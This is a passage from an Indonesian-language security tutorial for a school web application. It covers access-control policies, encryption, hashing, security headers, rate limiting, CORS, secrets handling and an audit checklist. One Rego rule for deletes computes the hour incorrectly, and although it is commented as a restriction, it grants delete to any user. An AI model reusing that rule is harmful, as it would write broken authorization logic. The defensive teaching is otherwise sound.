function evaluatePolicy(user, resource, action, environment) {
  const policies = [
    {
      id: 'guru_input_nilai',
      condition: (u, r, a, e) =>
        u.role === 'guru' &&
        a === 'create' &&
        r.type === 'nilai' &&
        u.mengajarKelas.includes(r.siswa.kelas) &&
        e.semesterAktif === true &&
        e.jam >= 7 && e.jam < 16,
      effect: 'allow',
    },
    {
      id: 'orang_tua_lihat_nilai',
      condition: (u, r, a, e) =>
        u.role === 'orang_tua' &&
        a === 'read' &&
        r.type === 'nilai' &&
        u.anakIds.includes(r.siswa.id),
      effect: 'allow',
    },
  ];

  for (const policy of policies) {
    if (policy.condition(user, resource, action, environment)) {
      return policy.effect === 'allow';
    }
  }
  return false; // Default deny
}
```

### PBAC (Policy-Based Access Control)

PBAC mirip ABAC tapi lebih fokus pada **policy statements** yang terstruktur, sering menggunakan format seperti XACML atau Rego (Open Policy Agent).

```
# OPA/Rego Policy Example
package sekolah.authorization

default allow = false

# Admin bisa akses semua
allow {
  input.user.role == "admin"
}

# Guru bisa input nilai untuk kelas yang diajar
allow {
  input.user.role == "guru"
  input.action == "create"
  input.resource.type == "nilai"
  input.user.kelas_diajar[_] == input.resource.siswa.kelas
}

# Orang tua hanya bisa lihat data anak sendiri
allow {
  input.user.role == "orang_tua"
  input.action == "read"
  input.resource.siswa.id == input.user.anak_id
}

# Tidak ada yang bisa hapus data di luar jam kerja
allow {
  input.action == "delete"
  time.now_ns / 1000000000 / 3600 >= 7
  time.now_ns / 1000000000 / 3600 < 16
}
```

### Authorization Models Comparison

```
┌─────────────────────────────────────────────────────────────────┐
│              AUTHORIZATION COMPARISON                           │
├──────────────────────┬──────────────┬────────────┬──────────────┤
│ Fitur                │ RBAC         │ ABAC       │ PBAC         │
├──────────────────────┼──────────────┼────────────┼──────────────┤
│ Basis keputusan      │ Role         │ Attributes │ Policies     │
│ Kompleksitas         │ Rendah       │ Tinggi     │ Tinggi       │
│ Fleksibilitas        │ Rendah       │ Tinggi     │ Sangat Tinggi│
│ Maintenance          │ Mudah        │ Kompleks   │ Kompleks     │
│ Cocok untuk          │ Tim kecil-   │ Enterprise │ Enterprise   │
│                      │ menengah     │            │ + compliance │
│ Audit                │ Mudah        │ Kompleks   │ Mudah (policy│
│                      │              │            │ terstruktur) │
│ Contoh tool          │ Custom code  │ AWS IAM    │ OPA, XACML   │
│                      │              │ Policies   │              │
└──────────────────────┴──────────────┴────────────┴──────────────┘
```

---

## 4. Encryption — Melindungi Data

### Symmetric Encryption

Satu kunci untuk enkripsi DAN dekripsi.

```
┌─────────────────────────────────────────────────────────────────┐
│              SYMMETRIC ENCRYPTION                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Enkripsi:                                                      │
│  Plaintext + Secret Key ──▶ [AES-256] ──▶ Ciphertext           │
│                                                                 │
│  Dekripsi:                                                      │
│  Ciphertext + Secret Key ──▶ [AES-256] ──▶ Plaintext           │
│                                                                 │
│  Algoritma populer:                                             │
│  - AES (Advanced Encryption Standard) — 128, 192, 256 bit      │
│  - ChaCha20 — Modern, cepat di software                        │
│  - 3DES — ❌ DEPRECATED, jangan pakai                          │
│                                                                 │
│  Modes:                                                         │
│  - ECB — ❌ Tidak aman (pattern terlihat)                       │
│  - CBC — OK tapi perlu padding                                 │
│  - GCM — ✅ Recommended (authenticated encryption)              │
│  - CTR — OK untuk streaming                                    │
│                                                                 │
│  Use case:                                                      │
│  - Enkripsi data di rest (database, file)                       │
│  - Enkripsi backup                                              │
│  - Enkripsi disk (full disk encryption)                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Implementasi:**
```javascript
const crypto = require('crypto');

function encryptAES256GCM(plaintext, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

  let encrypted = cipher.update(plaintext, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag();

  return {
    iv: iv.toString('hex'),
    encrypted,
    authTag: authTag.toString('hex'),
  };
}

function decryptAES256GCM(encrypted, key, iv, authTag) {
  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    key,
    Buffer.from(iv, 'hex')
  );
  decipher.setAuthTag(Buffer.from(authTag, 'hex'));

  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}
```

### Asymmetric Encryption (Public Key Cryptography)

Dua kunci: **public key** (untuk enkripsi) dan **private key** (untuk dekripsi).

```
┌─────────────────────────────────────────────────────────────────┐
│              ASYMMETRIC ENCRYPTION                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Key Pair:                                                      │
│  - Public Key  → Bisa dibagikan ke siapa saja                   │
│  - Private Key → RAHASIA, hanya pemilik yang tahu               │
│                                                                 │
│  Enkripsi (Confidentiality):                                    │
│  Plaintext + Receiver's Public Key ──▶ Ciphertext               │
│  Ciphertext + Receiver's Private Key ──▶ Plaintext              │
│  (Hanya receiver yang bisa decrypt!)                            │
│                                                                 │
│  Digital Signature (Authenticity + Integrity):                  │
│  Message + Sender's Private Key ──▶ Signature                   │
│  Signature + Sender's Public Key ──▶ Verify ✓/✗                 │
│  (Semua orang bisa verify, hanya sender yang bisa sign!)        │
│                                                                 │
│  Algoritma populer:                                             │
│  - RSA — Paling umum (2048, 4096 bit)                          │
│  - ECC (Elliptic Curve) — Lebih efisien, key lebih kecil        │
│  - Ed25519 — Modern, cepat, aman                               │
│                                                                 │
│  Use case:                                                      │
│  - TLS/SSL handshake (pertukaran kunci simetris)                │
│  - Digital signatures (code signing, document signing)          │
│  - JWT signing (RS256, ES256)                                   │
│  - SSH authentication                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### TLS/SSL — Secure Communication

TLS (Transport Layer Security) mengamankan komunikasi di jaringan.

```
┌─────────────────────────────────────────────────────────────────┐
│              TLS HANDSHAKE (SIMPLIFIED)                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Client                          Server                         │
│    │                                │                           │
│    │── ClientHello ────────────────▶│  "Saya support TLS 1.3,  │
│    │                                │   cipher suites: ..."     │
│    │                                │                           │
│    │◀── ServerHello ────────────────│  "Pakai TLS 1.3,         │
│    │◀── Certificate ───────────────│   ini certificate saya"   │
│    │◀── ServerKeyExchange ─────────│                           │
│    │                                │                           │
│    │── Client verify cert ─────────▶│  (Client cek cert valid) │
│    │── ClientKeyExchange ──────────▶│  (Kirim pre-master secret)│
│    │── Finished ───────────────────▶│                           │
│    │                                │                           │
│    │◀── Finished ───────────────────│                           │
│    │                                │                           │
│    │◀═══ ENCRYPTED CONNECTION ════▶│                           │
│    │    (Symmetric encryption)      │                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**TLS Certificate Chain:**
```
┌─────────────────────────────────────────────────────────────────┐
│              CERTIFICATE CHAIN                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Root CA (Self-signed, trusted by browsers)                     │
│  └── Intermediate CA (Signed by Root CA)                        │
│      └── Server Certificate (Signed by Intermediate CA)         │
│          → CN: sekolah.example.com                              │
│          → Issuer: Let's Encrypt Authority X3                   │
│          → Valid: 2024-01-01 to 2024-04-01                      │
│          → SAN: sekolah.example.com, www.sekolah.example.com    │
│                                                                 │
│  SSL/TLS Providers (Gratis):                                    │
│  - Let's Encrypt (otomatis via Certbot)                         │
│  - CloudFlare (free SSL)                                        │
│  - ZeroSSL                                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Hashing — One-Way Function

Hash mengubah data menjadi fingerprint unik. Tidak bisa di-reverse.

```
┌─────────────────────────────────────────────────────────────────┐
│                    HASHING                                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Input (apapun panjangnya) ──▶ [Hash Function] ──▶ Fixed Output │
│                                                                 │
│  Properties:                                                    │
│  - Deterministic: Input sama → Hash sama                        │
│  - One-way: Tidak bisa reverse dari hash ke input               │
│  - Collision resistant: Sulit cari 2 input dengan hash sama     │
│  - Avalanche effect: 1 bit berubah → Hash berubah total         │
│                                                                 │
│  Algoritma:                                                     │
│  ┌──────────────────┬──────────────┬───────────────────────────┐│
│  │ Algoritma        │ Output Size  │ Status                    ││
│  ├──────────────────┼──────────────┼───────────────────────────┤│
│  │ MD5              │ 128 bit      │ ❌ BROKEN — jangan pakai  ││
│  │ SHA-1            │ 160 bit      │ ❌ BROKEN — jangan pakai  ││
│  │ SHA-256          │ 256 bit      │ ✅ Aman (umum)            ││
│  │ SHA-512          │ 512 bit      │ ✅ Aman (lebih kuat)      ││
│  │ SHA-3            │ Variable     │ ✅ Aman (terbaru)         ││
│  │ bcrypt           │ Variable     │ ✅ Untuk password         ││
│  │ Argon2           │ Variable     │ ✅ Untuk password (best)  ││
│  └──────────────────┴──────────────┴───────────────────────────┘│
│                                                                 │
│  Use case:                                                      │
│  - Password storage (bcrypt, Argon2)                            │
│  - Data integrity check (checksum)                              │
│  - Digital signatures (hash dulu, lalu sign)                    │
│  - Deduplication (file fingerprint)                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Password Hashing Best Practices:**
```javascript
// ✅ RECOMMENDED — bcrypt
const bcrypt = require('bcrypt');
const saltRounds = 12; // ~250ms per hash

const hash = await bcrypt.hash(password, saltRounds);
const isValid = await bcrypt.compare(inputPassword, hash);

// ✅ ALTERNATIVE — Argon2 (lebih modern)
const argon2 = require('argon2');

const hash = await argon2.hash(password, {
  type: argon2.argon2id,    // Hybrid (resisten GPU + side-channel)
  memoryCost: 65536,        // 64 MB memory
  timeCost: 3,              // 3 iterations
  parallelism: 1,           // 1 thread
});
const isValid = await argon2.verify(hash, inputPassword);

// ❌ JANGAN — SHA256 untuk password
const badHash = crypto.createHash('sha256').update(password).digest('hex');
// Kenapa? SHA256 terlalu cepat → brute force mudah (miliaran hash/detik)
```

---

## 5. Security Headers

Security headers adalah HTTP response headers yang menginstruksikan browser untuk menerapkan kebijakan keamanan.

```
┌─────────────────────────────────────────────────────────────────┐
│              SECURITY HEADERS REFERENCE                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Strict-Transport-Security (HSTS)                            │
│  ─────────────────────────────────────────                      │
│  Strict-Transport-Security: max-age=31536000; includeSubDomains │
│  → Browser SELALU pakai HTTPS untuk domain ini                  │
│  → Mencegah SSL stripping attack                                │
│                                                                 │
│  2. Content-Security-Policy (CSP)                               │
│  ─────────────────────────────────                              │
│  Content-Security-Policy: default-src 'self';                   │
│    script-src 'self' https://cdn.example.com;                   │
│    style-src 'self' 'unsafe-inline';                            │
│    img-src 'self' data: https:;                                 │
│    font-src 'self' https://fonts.googleapis.com;                │
│  → Mencegah XSS — hanya load resource dari sumber terpercaya    │
│                                                                 │
│  3. X-Frame-Options                                             │
│  ─────────────────                                              │
│  X-Frame-Options: DENY          → Tidak boleh di-iframe sama    │
│                                   sekali                        │
│  X-Frame-Options: SAMEORIGIN    → Hanya boleh di-iframe dari    │
│                                   domain yang sama              │
│  → Mencegah clickjacking attack                                 │
│                                                                 │
│  4. X-Content-Type-Options                                        │
│  ─────────────────────────────                                    │
│  X-Content-Type-Options: nosniff                                  │
│  → Browser jangan tebak MIME type — pakai yang server kasih      │
│  → Mencegah MIME type confusion attack                           │
│                                                                 │
│  5. X-XSS-Protection (legacy)                                     │
│  ──────────────────────────                                       │
│  X-XSS-Protection: 1; mode=block                                  │
│  → Browser built-in XSS filter (sudah deprecated di modern      │
│    browser, tapi masih berguna untuk browser lama)               │
│                                                                 │
│  6. Referrer-Policy                                               │
│  ──────────────                                                   │
│  Referrer-Policy: strict-origin-when-cross-origin                 │
│  → Kontrol informasi yang dikirim di Referer header              │
│  → Mencegah leak URL sensitif ke third party                     │
│                                                                 │
│  7. Permissions-Policy (dulu Feature-Policy)                      │
│  ────────────────────────────────                                 │
│  Permissions-Policy: camera=(), microphone=(), geolocation=()     │
│  → Kontrol fitur browser yang boleh dipakai                      │
│  → Mencegah abuse device features                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Implementation (Express.js):**
```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.example.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'", "https://fonts.googleapis.com"],
      connectSrc: ["'self'", "https://api.example.com"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  frameguard: { action: 'deny' },
  noSniff: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permissionsPolicy: {
    camera: [],
    microphone: [],
    geolocation: [],
  },
}));
```

---

## 6. API Security

### Rate Limiting

Membatasi jumlah request untuk mencegah abuse.

```
┌─────────────────────────────────────────────────────────────────┐
│              RATE LIMITING STRATEGIES                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Fixed Window                                                │
│  ─────────────                                                  │
│  100 request per menit (reset tiap menit)                       │
│  ┌─────┬─────┬─────┬─────┐                                      │
│  │ 100 │ 100 │ 100 │ 100 │ ← Reset setiap window               │
│  └─────┴─────┴─────┴─────┘                                      │
│  Masalah: Burst di akhir window (200 request dalam 1 menit)     │
│                                                                 │
│  2. Sliding Window                                              │
│  ─────────────                                                  │
│  100 request per 60 detik terakhir (rolling)                    │
│  Lebih smooth, tapi lebih kompleks                              │
│                                                                 │
│  3. Token Bucket                                                │
│  ─────────────                                                  │
│  Bucket capacity: 100 tokens                                    │
│  Refill rate: 10 token/detik                                    │
│  Setiap request = 1 token                                       │
│  Jika bucket kosong → reject                                    │
│  Mendukung burst tapi tetap limit rata-rata                     │
│                                                                 │
│  4. Leaky Bucket                                                │
│  ─────────────                                                  │
│  Request masuk ke queue, diproses dengan rate konstan           │
│  Jika queue penuh → reject                                      │
│  Output selalu smooth                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Implementation:**
```javascript
const rateLimit = require('express-rate-limit');

// Global rate limiter
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                  // 100 requests per window
  message: {
    error: 'Too many requests',
    retryAfter: '15 minutes',
  },
  standardHeaders: true,     // Return rate limit info in headers
  legacyHeaders: false,
});

// Login-specific rate limiter (lebih ketat)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,                    // Hanya 5 percobaan login per 15 menit
  message: {
    error: 'Too many login attempts',
    retryAfter: '15 minutes',
  },
  skipSuccessfulRequests: true, // Hanya limit yang gagal
});

// API-specific rate limiter
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,       // 1 minute
  max: 30,                   // 30 requests per minute
  keyGenerator: (req) => req.user?.id || req.ip, // Per user or per IP
});

app.use('/api/', globalLimiter);
app.post('/api/login', loginLimiter, loginHandler);
app.use('/api/siswa', authenticate, apiLimiter, siswaRouter);
```

### CORS (Cross-Origin Resource Sharing)

Kontrol siapa yang boleh akses API dari browser.

```javascript
const cors = require('cors');

// ❌ SALAH — Allow semua origin
app.use(cors({ origin: '*' }));

// ✅ BENAR — Allow specific origins
app.use(cors({
  origin: [
    'https://sekolah.example.com',
    'https://admin.sekolah.example.com',
    'https://portal.sekolah.example.com',
  ],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Request-Id'],
  credentials: true,           // Allow cookies
  maxAge: 86400,               // Cache preflight 24 hours
}));

// CORS untuk endpoint spesifik
app.use('/api/public', cors({ origin: '*' })); // Public API
app.use('/api/admin', cors({                   // Admin API
  origin: 'https://admin.sekolah.example.com',
  credentials: true,
}));
```

### Input Validation

```javascript
const { body, param, query, validationResult } = require('express-validator');

// Validation rules
const createSiswaValidation = [
  body('nisn')
    .isString()
    .isLength({ min: 10, max: 10 })
    .matches(/^\d+$/)
    .withMessage('NISN harus 10 digit angka'),
  body('nama')
    .isString()
    .trim()
    .isLength({ min: 2, max: 100 })
    .withMessage('Nama harus 2-100 karakter')
    .matches(/^[a-zA-Z\s.'-]+$/)
    .withMessage('Nama hanya boleh huruf, spasi, titik, dan strip'),
  body('kelas')
    .isIn(['1A', '1B', '2A', '2B', '3A', '3B', '4A', '4B', '5A', '5B', '6A', '6B'])
    .withMessage('Kelas tidak valid'),
  body('tanggalLahir')
    .isISO8601()
    .withMessage('Format tanggal tidak valid')
    .custom((value) => {
      const age = new Date().getFullYear() - new Date(value).getFullYear();
      if (age < 6 || age > 18) throw new Error('Umur harus 6-18 tahun');
      return true;
    }),
  body('email')
    .optional()
    .isEmail()
    .normalizeEmail(),
];

// Validation middleware
function validate(req, res, next) {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      error: 'Validation failed',
      details: errors.array().map(e => ({
        field: e.path,
        message: e.msg,
      })),
    });
  }
  next();
}

// Usage
app.post('/api/siswa',
  authenticate,
  authorize('siswa:create'),
  createSiswaValidation,
  validate,
  createSiswaHandler
);
```

### API Keys

```javascript
// API Key authentication untuk server-to-server
const apiKeys = new Map();

// Generate API key
function generateApiKey() {
  return 'sk_live_' + crypto.randomBytes(32).toString('hex');
}

// Store hashed API key (never store plaintext)
async function storeApiKey(serviceName, plainKey) {
  const hash = crypto.createHash('sha256').update(plainKey).digest('hex');
  apiKeys.set(hash, { name: serviceName, createdAt: new Date() });
  return plainKey; // Return plaintext ONCE to the user
}

// API Key middleware
async function authenticateApiKey(req, res, next) {
  const key = req.headers['x-api-key'];
  if (!key) {
    return res.status(401).json({ error: 'API key required' });
  }

  const hash = crypto.createHash('sha256').update(key).digest('hex');
  const service = apiKeys.get(hash);

  if (!service) {
    return res.status(403).json({ error: 'Invalid API key' });
  }

  req.apiService = service;
  next();
}
```

---

## 7. Network Security

### Firewall

Firewall mengontrol traffic masuk dan keluar berdasarkan rules.

```
┌─────────────────────────────────────────────────────────────────┐
│                    FIREWALL RULES                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Default Policy: DENY ALL (whitelist approach)                  │
│                                                                 │
│  Rules (processed top to bottom, first match wins):             │
│  ┌─────┬────────┬──────────────┬────────┬────────┬────────────┐ │
│  │ #   │ Action │ Source       │ Dest   │ Port   │ Protocol   │ │
│  ├─────┼────────┼──────────────┼────────┼────────┼────────────┤ │
│  │ 1   │ ALLOW  │ 10.0.0.0/8   │ Any    │ 443    │ TCP        │ │
│  │     │        │ (internal)   │        │        │ (HTTPS)    │ │
│  ├─────┼────────┼──────────────┼────────┼────────┼────────────┤ │
│  │ 2   │ ALLOW  │ Any          │ Web    │ 443    │ TCP        │ │
│  │     │        │              │ Server │        │ (HTTPS in) │ │
│  ├─────┼────────┼──────────────┼────────┼────────┼────────────┤ │
│  │ 3   │ ALLOW  │ Any          │ Web    │ 80     │ TCP        │ │
│  │     │        │              │ Server │        │ (HTTP→HTTPS)││
│  ├─────┼────────┼──────────────┼────────┼────────┼────────────┤ │
│  │ 4   │ ALLOW  │ App Server   │ DB     │ 5432   │ TCP        │ │
│  │     │        │ (10.0.1.0/24)│ Server │        │ (PostgreSQL)││
│  ├─────┼────────┼──────────────┼────────┼────────┼────────────┤ │
│  │ 5   │ ALLOW  │ Admin IP     │ Any    │ 22     │ TCP        │ │
│  │     │        │ (x.x.x.x)    │        │        │ (SSH)      │ │
│  ├─────┼────────┼──────────────┼────────┼────────┼────────────┤ │
│  │ 6   │ DENY   │ Any          │ Any    │ Any    │ Any        │ │
│  │     │        │              │        │        │ (DEFAULT)  │ │
│  └─────┴────────┴──────────────┴────────┴────────┴────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### VPC (Virtual Private Cloud) dan Security Groups

```
┌─────────────────────────────────────────────────────────────────┐
│              VPC ARCHITECTURE — SEKOLAH                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  VPC: 10.0.0.0/16                                               │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Public Subnet (10.0.1.0/24)                              │  │
│  │  ┌─────────────┐  ┌─────────────┐                         │  │
│  │  │ Load        │  │ NAT Gateway │                         │  │
│  │  │ Balancer    │  │             │                         │  │
│  │  └──────┬──────┘  └──────┬──────┘                         │  │
│  └─────────┼────────────────┼────────────────────────────────┘  │
│            │                │                                   │
│  ┌─────────┼────────────────┼────────────────────────────────┐  │
│  │  Private Subnet App (10.0.2.0/24)                         │  │
│  │  ┌─────────────┐  ┌─────────────┐                         │  │
│  │  │ App Server  │  │ App Server  │                         │  │
│  │  │ (Node.js)   │  │ (Node.js)   │                         │  │
│  │  └──────┬──────┘  └──────┬──────┘                         │  │
│  └─────────┼────────────────┼────────────────────────────────┘  │
│            │                │                                   │
│  ┌─────────┼────────────────┼────────────────────────────────┐  │
│  │  Private Subnet DB (10.0.3.0/24)                          │  │
│  │  ┌─────────────┐  ┌─────────────┐                         │  │
│  │  │ PostgreSQL  │  │ Redis       │                         │  │
│  │  │ Primary     │  │ (Cache)     │                         │  │
│  │  └─────────────┘  └─────────────┘                         │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  Security Groups:                                               │
│  - SG-LB:       Allow 443/80 from 0.0.0.0/0                    │
│  - SG-App:      Allow 3000 from SG-LB only                     │
│  - SG-DB:       Allow 5432 from SG-App only                    │
│  - SG-Redis:    Allow 6379 from SG-App only                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 8. Secrets Management

Jangan pernah hardcode secrets di source code!

```
┌─────────────────────────────────────────────────────────────────┐
│              SECRETS MANAGEMENT BEST PRACTICES                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ❌ JANGAN:                                                     │
│  - Hardcode di source code                                      │
│  - Commit ke git                                                │
│  - Simpan di environment file yang di-commit                    │
│  - Kirim via chat/email                                         │
│  - Log di console atau log file                                 │
│                                                                 │
│  ✅ LAKUKAN:                                                    │
│  - Gunakan environment variables                                │
│  - Gunakan secrets manager (AWS Secrets Manager, HashiCorp      │
│    Vault, Azure Key Vault)                                      │
│  - Rotate secrets secara berkala                                │
│  - Gunakan .gitignore untuk .env files                          │
│  - Audit akses ke secrets                                       │
│                                                                 │
│  .gitignore:                                                    │
│  .env                                                           │
│  .env.*                                                         │
│  *.key                                                          │
│  *.pem                                                          │
│  secrets/                                                       │
│                                                                 │
│  Environment variables:                                         │
│  DATABASE_URL=postgresql://user:pass@host:5432/db               │
│  JWT_SECRET=<random-256-bit-string>                             │
│  API_KEY=<generated-key>                                        │
│  ENCRYPTION_KEY=<base64-encoded-key>                            │
│                                                                 │
│  HashiCorp Vault example:                                       │
│  vault kv put secret/sekolah/db \                               │
│    username=admin \                                             │
│    password=s3cur3p4ss                                          │
│                                                                 │
│  vault kv get secret/sekolah/db                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 9. Security Auditing

### Security Checklist untuk Aplikasi Sekolah

```
┌─────────────────────────────────────────────────────────────────┐
│              SECURITY AUDIT CHECKLIST                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  AUTHENTICATION:                                                │
│  [ ] Password di-hash dengan bcrypt/Argon2 (bukan MD5/SHA1)    │
│  [ ] Minimum password length 8 karakter                         │
│  [ ] Brute force protection (max 5 attempts, lockout)          │
│  [ ] Session timeout (24 jam max)                               │
│  [ ] Secure cookie flags (httpOnly, secure, sameSite)           │
│  [ ] Multi-factor authentication tersedia                       │
│                                                                 │
│  AUTHORIZATION:                                                 │
│  [ ] Role-based access control implemented                      │
│  [ ] Default deny (tidak ada akses tanpa explicit allow)        │
│  [ ] IDOR protection (cek ownership di setiap request)          │
│  [ ] Admin endpoints protected                                  │
│  [ ] API versioning untuk backward compatibility                │
│                                                                 │
│  DATA PROTECTION:                                               │
│  [ ] HTTPS enforced (HSTS header)                               │
│  [ ] Data sensitif dienkripsi di database                       │
│  [ ] Backup dienkripsi                                          │
│  [ ] PII (Personal Identifiable Information) di-minimize        │
│  [ ] Data retention policy (hapus data yang tidak diperlukan)   │
│                                                                 │
│  INPUT/OUTPUT:                                                  │
│  [ ] Input validation di semua endpoint                         │
│  [ ] Output encoding/sanitization                               │
│  [ ] Parameterized queries (no SQL injection)                   │
│  [ ] CSP header configured                                      │
│  [ ] File upload validation (type, size, content)               │
│                                                                 │
│  INFRASTRUCTURE:                                                │
│  [ ] Firewall configured (default deny)                         │
│  [ ] Security groups/VPC properly set                           │
│  [ ] Dependencies audited (npm audit, etc)                      │
│  [ ] Server version headers hidden                              │
│  [ ] Error messages tidak leak sensitive info                   │
│  [ ] Rate limiting implemented                                  │
│                                                                 │
│  MONITORING:                                                    │
│  [ ] Security event logging                                     │
│  [ ] Failed login monitoring                                    │
│  [ ] Anomalous activity detection                               │
│  [ ] Audit trail untuk data modification                        │
│  [ ] Alerting untuk critical events                             │
│                                                                 │
│  COMPLIANCE:                                                    │
│  [ ] UU PDP compliance (Indonesia)                              │
│  [ ] Data processing agreement dengan third party               │
│  [ ] Privacy policy published                                   │
│  [ ] Data breach response plan                                  │
│  [ ] Regular security training untuk staff                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Security Testing Tools

```
┌─────────────────────────────────────────────────────────────────┐
│              SECURITY TESTING TOOLS                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Static Analysis (SAST):                                        │
│  - ESLint security plugin (JavaScript)                          │
│  - Bandit (Python)                                              │
│  - SonarQube (multi-language)                                   │
│  - Semgrep (multi-language, fast)                               │
│                                                                 │
│  Dependency Scanning:                                           │
│  - npm audit / yarn audit                                       │
│  - Snyk                                                         │
│  - Trivy                                                        │
│  - Dependabot (GitHub)                                          │
│                                                                 │
│  Dynamic Analysis (DAST):                                       │
│  - OWASP ZAP (Zed Attack Proxy) — gratis, open source           │
│  - Burp Suite — profesional, berbayar                           │
│  - Nmap — network scanning                                      │
│                                                                 │
│  Penetration Testing:                                           │
│  - Manual testing oleh security professional                    │
│  - Bug bounty program                                           │
│  - Red team exercise                                            │
│                                                                 │
│  Continuous Security:                                           │
│  - Git hooks (pre-commit secret scanning)                       │
│  - CI/CD security pipeline                                      │
│  - Infrastructure as Code scanning (tfsec, checkov)             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🎯 CONTOH NYATA

### Contoh: Arsitektur Keamanan Aplikasi Sekolah

```
┌─────────────────────────────────────────────────────────────────┐
│              SECURITY ARCHITECTURE — APLIKASI SEKOLAH           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Layer 1: Network Security                                      │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  WAF (Web Application Firewall)                         │    │
│  │  → Block SQL injection, XSS, known attack patterns      │    │
│  │  → Rate limiting di edge                                │    │
│  │  → DDoS protection                                      │    │
│  └──────────────────────┬──────────────────────────────────┘    │
│                         │                                       │
│  Layer 2: Transport Security                                    │
│  ┌──────────────────────┴──────────────────────────────────┐    │
│  │  TLS 1.3 (HTTPS)                                        │    │
│  │  → HSTS header                                          │    │
│  │  → Certificate auto-renewal (Let's Encrypt)             │    │
│  └──────────────────────┬──────────────────────────────────┘    │
│                         │                                       │
│  Layer 3: API Security                                          │
│  ┌──────────────────────┴──────────────────────────────────┐    │
│  │  API Gateway                                            │    │
│  │  → JWT authentication                                   │    │
│  │  → Rate limiting per user/IP                            │    │
│  │  → Input validation                                     │    │
│  │  → CORS policy                                          │    │
│  └──────────────────────┬──────────────────────────────────┘    │
│                         │                                       │
│  Layer 4: Application Security                                  │
│  ┌──────────────────────┴──────────────────────────────────┐    │
│  │  Application Server                                     │    │
│  │  → RBAC authorization                                   │    │
│  │  → Parameterized queries                                │    │
│  │  → Output encoding                                      │    │
│  │  → Security headers (Helmet)                            │    │
│  └──────────────────────┬──────────────────────────────────┘    │
│                         │                                       │
│  Layer 5: Data Security                                         │
│  ┌──────────────────────┴──────────────────────────────────┐    │
│  │  Database                                               │    │
│  │  → Encrypted at rest (AES-256)                          │    │
│  │  → Encrypted in transit (TLS)                           │    │
│  │  → Password hashed (bcrypt/Argon2)                      │    │
│  │  → Row-level security                                   │    │
│  │  → Audit logging                                        │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 💡 PRAKTIK

### Latihan 1: Audit Keamanan

Anda menemukan website sekolah dengan masalah berikut. Bagaimana solusinya?

1. Login pakai HTTP (bukan HTTPS)
2. Query SQL langsung concat input user
3. Password disimpan di database dalam bentuk teks biasa
4. Tidak ada batasan percobaan login
5. Halaman admin bisa diakses tanpa login
6. Error message menampilkan stack trace
7. CORS设置为 `*` (wildcard)
8. Tidak ada security headers

**Jawaban:**
1. Pasang SSL/HTTPS (Let's Encrypt gratis), redirect HTTP ke HTTPS
2. Ganti ke parameterized query / ORM
3. Hash password dengan bcrypt (salt rounds 12) atau Argon2
4. Implement rate limiting (max 5 percobaan, block 15 menit)
5. Tambahkan middleware autentikasi + authorization (RBAC)
6. Generic error message untuk user, detail error di server log
7. Set CORS ke specific origins yang trusted
8. Tambahkan security headers (Helmet.js): CSP, HSTS, X-Frame-Options, dll

### Latihan 2: Desain RBAC

Desain role-based access control untuk sistem sekolah dengan role:
- Admin Sekolah
- Kepala Sekolah
- Guru
- Wali Kelas
- Orang Tua
- Siswa

Tentukan permissions untuk setiap role.

### Latihan 3: Security Headers

Konfigurasi security headers untuk website sekolah menggunakan Nginx atau Express.js.

---

## ✅ CHECKLIST

- [ ] Bisa jelaskan CIA Triad (Confidentiality, Integrity, Availability)
- [ ] Paham OWASP Top 10 dan cara mitigasi masing-masing
